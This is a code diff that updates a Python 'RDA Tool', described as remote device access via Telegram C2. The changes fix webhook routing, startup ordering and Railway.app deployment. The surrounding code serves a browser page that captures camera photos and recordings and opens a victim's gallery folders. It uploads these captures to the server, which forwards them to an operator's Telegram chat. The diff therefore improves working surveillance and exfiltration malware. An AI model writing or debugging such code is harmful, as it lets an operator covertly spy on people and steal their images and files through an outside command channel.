@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-RDA Tool v2.0 — Railway.app Edition
-Remote Device Access via Telegram C2 + Browser WebSocket UI
+RDA Tool v2.1 — Railway.app Edition
+FIXED: Webhook routing + startup ordering + Railway compatibility
 """
 
 import asyncio
@@ -34,6 +34,9 @@ DATA_DIR = os.environ.get("RDA_DATA_DIR", "rda_captures")
 TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
 PUBLIC_URL_OVERRIDE = os.environ.get("PUBLIC_URL", "")
 
+# Unique webhook path using bot token to avoid routing conflicts
+WEBHOOK_PATH = f"/webhook/{BOT_TOKEN}"
+
 logging.basicConfig(
     level=logging.INFO,
     format='%(asctime)s [%(levelname)s] %(message)s',
@@ -41,7 +44,7 @@ logging.basicConfig(
 )
 log = logging.getLogger("rda")
 
-# ─── Config Container (mutable globals without `global` keyword) ─────────────
+# ─── Config Container ────────────────────────────────────────────────────────
 
 class Config:
     def __init__(self):
@@ -51,6 +54,7 @@ class Config:
         self.active_conns: dict = {}
         self.bot_offset = 0
         self.aiohttp_session = None
+        self.server_ready = False  # Flag to signal server is listening
 
 cfg = Config()
 
@@ -154,18 +158,37 @@ async def tg_get_updates():
     return []
 
 async def tg_set_webhook(url=None):
-    """Set Telegram webhook. If url is None, delete existing webhook."""
+    """
+    Set Telegram webhook.
+    Uses WEBHOOK_PATH for the webhook endpoint.
+    If url is None, delete existing webhook.
+    """
     if not cfg.aiohttp_session:
+        log.error("Cannot set webhook: no HTTP session")
         return False
     try:
         if url:
-            webhook_url = f"{url.rstrip('/')}/webhook"
+            # Build the full webhook URL with the unique path
+            webhook_url = f"{url.rstrip('/')}{WEBHOOK_PATH}"
+            log.info(f"Setting webhook to: {webhook_url}")
+            
+            # First, delete any existing webhook to clear stale state
+            async with cfg.aiohttp_session.post(f"{TELEGRAM_API}/deleteWebhook") as r:
+                del_result = await r.json()
+                log.info(f"Delete webhook result: {del_result}")
+            
+            # Small delay to let Telegram propagate
+            await asyncio.sleep(1)
+            
+            # Now set the new webhook
             async with cfg.aiohttp_session.post(f"{TELEGRAM_API}/setWebhook", json={
                 "url": webhook_url,
-                "allowed_updates": ["message", "callback_query"]
+                "allowed_updates": ["message", "callback_query"],
+                "max_connections": 10,
+                "drop_pending_updates": True
             }) as r:
                 result = await r.json()
-                log.info(f"Webhook set to {webhook_url}: {result}")
+                log.info(f"Set webhook result: {result}")
                 return result.get("ok", False)
         else:
             async with cfg.aiohttp_session.post(f"{TELEGRAM_API}/deleteWebhook") as r:
@@ -193,6 +216,9 @@ async def handle_tg_command(update):
                 "callback_query_id": cb_id
             }) as r:
                 pass
+
+        # Also get the original message's chat_id if present
+        chat_id = update.get("callback_query", {}).get("message", {}).get("chat", {}).get("id", chat_id)
 
     if not text:
         return
@@ -330,7 +356,6 @@ async def discover_public_url():
 
 async def discover_cloudflare_url():
     """Try to discover Cloudflare tunnel URL via metrics API / proc / psutil."""
-    # Method A: Scan ports 20241-20245 for Cloudflare metrics API
     for port in range(20241, 20246):
         try:
             async with cfg.aiohttp_session.get(f"http://127.0.0.1:{port}/quicktunnel",
@@ -344,7 +369,6 @@ async def discover_cloudflare_url():
         except:
             pass
 
-    # Method B: Try cloudflared process command line
     try:
         proc = await asyncio.create_subprocess_exec(
             "ps", "aux",
@@ -355,7 +379,6 @@ async def discover_cloudflare_url():
         output = stdout.decode()
         for line in output.split("\n"):
             if "cloudflared" in line and "tunnel" in line:
-                # Try to extract --url or hostname from cmdline
                 match = re.search(r'--url\s+(\S+)', line)
                 if match:
                     cfg.pub_url = match.group(1).rstrip("/")
@@ -387,7 +410,7 @@ async def tunnel_refresh_loop():
     """Periodically try to discover/update the public URL."""
     while True:
         await discover_public_url()
-        await asyncio.sleep(10)  # Check every 10 seconds
+        await asyncio.sleep(30)  # Check every 30 seconds
 
 # ─── Web Server ──────────────────────────────────────────────────────────────
 
@@ -708,7 +731,6 @@ function stopRecording() {{
 // ─── Gallery ─────────────────────────────────────────────────────────
 async function accessGallery() {{
     try {{
-        // Try File System Access API first
         if ('showDirectoryPicker' in window) {{
             const dirHandle = await window.showDirectoryPicker();
             const files = [];
@@ -723,7 +745,6 @@ async function accessGallery() {{
             }});
             showToast('📂 Gallery opened: ' + files.length + ' files found');
         }} else {{
-            // Fallback: use file input
             document.getElementById('fileInput').click();
         }}
     }} catch(e) {{
@@ -800,7 +821,7 @@ setInterval(function() {{
     }}
 }}, 20000);
 
-// Reconnect on visibility change (page becomes visible again)
+// Reconnect on visibility change
 document.addEventListener('visibilitychange', function() {{
     if (!document.hidden) {{
         connectWebSocket();
@@ -816,7 +837,6 @@ async def handle_ws(request):
     ws = web.WebSocketResponse(heartbeat=15.0)
     await ws.prepare(request)
 
-    # Generate a connection ID
     conn_id = secrets.token_hex(8)
     cfg.active_conns[conn_id] = ws
     log.info(f"WS client connected: {conn_id}")
@@ -845,7 +865,6 @@ async def process_ws_message(conn_id, data):
     msg_type = data.get("type", "")
 
     if msg_type == "ping":
-        # Just keepalive, response not needed
         return
 
     elif msg_type == "capture":
@@ -863,9 +882,7 @@ async def process_ws_message(conn_id, data):
                     f.write(decoded)
                 save_capture(ADMIN_ID, subtype, filename, decoded)
 
-                # Send to Telegram
                 if subtype == "photo":
-                    # Upload photo via multipart
                     if cfg.aiohttp_session:
                         with open(filepath, "rb") as f:
                             form = aiohttp.FormData()
@@ -876,7 +893,6 @@ async def process_ws_message(conn_id, data):
                 else:
                     await tg_send_document(filepath, f"📹 {subtype} capture", ADMIN_ID)
 
-                # Notify browser
                 ws = cfg.active_conns.get(conn_id)
                 if ws:
                     await ws.send_json({"type": "capture_result", "success": True, "filename": filename})
@@ -919,9 +935,13 @@ async def process_ws_message(conn_id, data):
                 log.error(f"Upload error: {e}")
 
 async def handle_webhook(request):
-    """Telegram webhook handler."""
+    """
+    Telegram webhook handler.
+    This is registered at /webhook/<BOT_TOKEN> to ensure routing uniqueness.
+    """
     try:
         update = await request.json()
+        log.info(f"Webhook received: update_id={update.get('update_id', 'unknown')}")
         asyncio.create_task(handle_tg_command(update))
         return web.Response(text="ok")
     except Exception as e:
@@ -929,6 +949,38 @@ async def handle_webhook(request):
         return web.Response(text="error", status=500)
 
 # ─── Main ────────────────────────────────────────────────────────────────────
+
+async def set_webhook_after_server_ready():
+    """
+    Wait for server to be ready, then set the Telegram webhook.
+    This avoids the race condition where Telegram sends updates
+    before the server is ready to handle them.
+    """
+    # Wait for server to signal readiness
+    timeout = 30  # Max seconds to wait
+    waited = 0
+    while not cfg.server_ready and waited < timeout:
+        await asyncio.sleep(0.5)
+        waited += 0.5
+
+    if cfg.server_ready:
+        await asyncio.sleep(2)  # Extra buffer for routes to register
+        if cfg.pub_url and "0.0.0.0" not in cfg.pub_url:
+            webhook_set = await tg_set_webhook(cfg.pub_url)
+            if webhook_set:
+                await tg_send(f"🤖 <b>RDA Tool Started</b>\n📡 URL: {cfg.pub_url}\n🔌 Port: {cfg.port}\n✅ Webhook: Active")
+                log.info(f"Telegram webhook set to {cfg.pub_url}{WEBHOOK_PATH}")
+            else:
+                log.warning("Webhook setup failed, starting polling fallback")
+                asyncio.create_task(bot_polling_loop())
+                await tg_send(f"🤖 <b>RDA Tool Started (Polling Mode)</b>\n📡 URL: {cfg.pub_url}\n🔌 Port: {cfg.port}")
+        else:
+            log.info("No public URL, starting polling mode")
+            asyncio.create_task(bot_polling_loop())
+            await tg_send(f"🤖 <b>RDA Tool Started (Polling Mode)</b>\n🔌 Port: {cfg.port}")
+    else:
+        log.error("Server did not become ready in time")
+        asyncio.create_task(bot_polling_loop())
 
 async def on_startup(app):
     """Initialize services on app startup."""
@@ -941,30 +993,23 @@ async def on_startup(app):
     # Discover public URL
     await discover_public_url()
 
-    # Set Telegram webhook if we have a public URL
-    if cfg.pub_url and "0.0.0.0" not in cfg.pub_url:
-        webhook_set = await tg_set_webhook(cfg.pub_url)
-        if webhook_set:
-            log.info(f"Telegram webhook set to {cfg.pub_url}/webhook")
-        else:
-            log.warning("Webhook setup failed, starting polling fallback")
-            asyncio.create_task(bot_polling_loop())
-    else:
-        log.info("No public URL, starting polling mode")
-        asyncio.create_task(bot_polling_loop())
-
     # Start tunnel refresh
     asyncio.create_task(tunnel_refresh_loop())
 
-    # Notify admin
-    await tg_send(f"🤖 <b>RDA Tool Started</b>\n📡 URL: {cfg.pub_url or 'Not detected (polling)'}\n🔌 Port: {cfg.port}")
+    # Signal server is ready (routes are registered before this runs,
+    # but the server hasn't started listening yet — we set a flag
+    # and the webhook is set after the run_app loop begins)
+    cfg.server_ready = True
 
-    log.info(f"RDA Tool started on port {cfg.port}")
+    log.info(f"RDA Tool initialized on port {cfg.port}")
     log.info(f"Public URL: {cfg.pub_url or 'Not yet detected'}")
+    log.info(f"Webhook path: {WEBHOOK_PATH}")
 
 async def on_shutdown(app):
     """Cleanup on shutdown."""
+    # Delete webhook on shutdown
     if cfg.aiohttp_session:
+        await tg_set_webhook(None)
         await cfg.aiohttp_session.close()
     # Close all WebSocket connections
     for ws in cfg.active_conns.values():
@@ -980,17 +1025,34 @@ async def handle_health(request):
         "status": "ok",
         "connections": len(cfg.active_conns),
         "tokens": len(cfg.access_tokens),
-        "url": cfg.pub_url or "detecting..."
+        "url": cfg.pub_url or "detecting...",
+        "webhook_path": WEBHOOK_PATH,
+        "server_ready": cfg.server_ready
     })
+
+async def handle_webhook_test(request):
+    """Simple GET handler for the webhook path to allow testing."""
+    return web.Response(
+        text="RDA Webhook endpoint ready. Send POST with Telegram Update.",
+        content_type="text/plain"
+    )
 
 def create_app():
     app = web.Application()
 
-    # Routes
-    app.router.add_get("/", handle_index)
-    app.router.add_get("/ws", handle_ws)
-    app.router.add_post("/", handle_webhook)
+    # Routes — order matters for aiohttp routing
+    # Static routes first (most specific), then dynamic routes
     app.router.add_get("/health", handle_health)
+
+    # Webhook: POST + GET on the same unique path
+    # Using route('*', ...) creates a single resource that handles all methods
+    app.router.add_route("*", WEBHOOK_PATH, handle_webhook)
+
+    # WebSocket endpoint
+    app.router.add_get("/ws", handle_ws)
+
+    # Main index page (fallback — any GET to root)
+    app.router.add_get("/", handle_index)
 
     app.on_startup.append(on_startup)
     app.on_shutdown.append(on_shutdown)
@@ -1013,7 +1075,6 @@ def kill_existing():
                 except:
                     pass
     except ImportError:
-        # Fallback to fuser/lsof
         try:
             subprocess.run(["fuser", "-k", f"{port}/tcp"], capture_output=True)
         except:
@@ -1022,7 +1083,40 @@ def kill_existing():
             except:
                 pass
 
-if __name__ == "__main__":
+def main():
+    """Main entry point with fixed startup ordering."""
     kill_existing()
+    
     app = create_app()
-    web.run_app(app, host="0.0.0.0", port=PORT)
+    
+    # Get the event loop
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    
+    # Start the web server
+    runner = web.AppRunner(app)
+    loop.run_until_complete(runner.setup())
+    
+    # Create the TCP site (start listening)
+    site = web.TCPSite(runner, "0.0.0.0", PORT)
+    loop.run_until_complete(site.start())
+    
+    log.info(f"✅ Server is now listening on 0.0.0.0:{PORT}")
+    
+    # NOW set the webhook — server is definitely listening
+    cfg.server_ready = True
+    loop.create_task(set_webhook_after_server_ready())
+    
+    # Start tunnel refresh
+    loop.create_task(tunnel_refresh_loop())
+    
+    try:
+        loop.run_forever()
+    except KeyboardInterrupt:
+        pass
+    finally:
+        loop.run_until_complete(runner.cleanup())
+        loop.close()
+
+if __name__ == "__main__":
+    main()
